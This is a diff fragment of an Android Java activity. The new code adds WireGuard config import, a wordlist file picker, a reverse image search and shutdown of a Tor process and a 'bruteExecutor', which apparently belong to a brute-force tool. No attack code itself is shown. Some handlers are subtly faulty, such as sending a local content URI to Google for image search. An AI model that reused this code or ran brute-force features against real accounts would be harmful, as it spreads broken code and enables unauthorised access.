-                    for (int i = 0; i < engine.getCount(); i++) {
-                        if (engineName.equals(String.valueOf(engine.getItemAtPosition(i)))) {
-                            engine.setSelection(i);
-                            break;
-                        }
-                    }
+    // ==================== ACTIVITY RESULT ====================
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (resultCode != RESULT_OK || data == null || data.getData() == null) return;
+
+        Uri uri = data.getData();
+        if (requestCode == VPN_CONFIG_REQUEST) {
+            try {
+                String config;
+                try (InputStream is = getContentResolver().openInputStream(uri);
+                     ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
+                    if (is == null) throw new IOException("Cannot read file");
+                    byte[] buf = new byte[4096]; int n;
+                    while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
+                    config = baos.toString("UTF-8");
                 }
-                status.setText("Loaded saved search. Tap Search to run it again.");
-            })
-            .setPositiveButton("Close", null)
-            .setNegativeButton("Clear history", (d, w) ->
-                getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove(HISTORY).apply())
-            .show();
+                if (!config.contains("[Interface]") || !config.contains("[Peer]")) {
+                    status.setText("Not a valid WireGuard config");
+                    return;
+                }
+                // Save URI for quick connect
+                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wg_config_uri", uri.toString()).apply();
+                Intent open = new Intent(Intent.ACTION_VIEW);
+                open.setDataAndType(uri, "application/x-wireguard-profile");
+                open.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                startActivity(Intent.createChooser(open, "Import into WireGuard"));
+                status.setText("WireGuard config imported");
+            } catch (Exception e) {
+                status.setText("Error importing config: " + e.getMessage());
+                new AlertDialog.Builder(this).setTitle("WireGuard required")
+                        .setMessage("Install WireGuard from Play Store")
+                        .setPositiveButton("Install", (d, w) -> installWireguard())
+                        .setNegativeButton("Cancel", null).show();
+            }
+        } else if (requestCode == FILE_PICK_REQUEST) {
+            // Save wordlist path
+            String path = uri.getPath();
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wordlist_path", path).apply();
+            status.setText("Wordlist loaded: " + path);
+        } else if (requestCode == IMAGE_PICK_REQUEST || requestCode == IMAGE_PICK_REQUEST + 1) {
+            // Reverse image search
+            String imageUrl = uri.toString();
+            web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(imageUrl));
+            web.setVisibility(View.VISIBLE);
+            status.setText("Reverse image search...");
+        }
     }
 
-    private String enc(String value) {
-        try { return java.net.URLEncoder.encode(value, "UTF-8"); }
-        catch (Exception e) { return value; }
+    // ==================== BACK PRESS ====================
+    @Override
+    public void onBackPressed() {
+        if (drawer.isDrawerOpen(Gravity.START)) {
+            drawer.closeDrawer(Gravity.START);
+        } else if (web.canGoBack()) {
+            web.goBack();
+        } else {
+            super.onBackPressed();
+        }
     }
 
-    @Override protected void onDestroy() {
-        if (torBound) { try { unbindService(torConnection); } catch (Exception ignored) { } }
-        if (web != null) web.destroy();
+    // ==================== DESTROY ====================
+    @Override
+    protected void onDestroy() {
+        if (torProcess != null) {
+            torProcess.destroy();
+            torProcess = null;
+        }
+        if (bruteExecutor != null) bruteExecutor.shutdownNow();
         super.onDestroy();
     }
 }
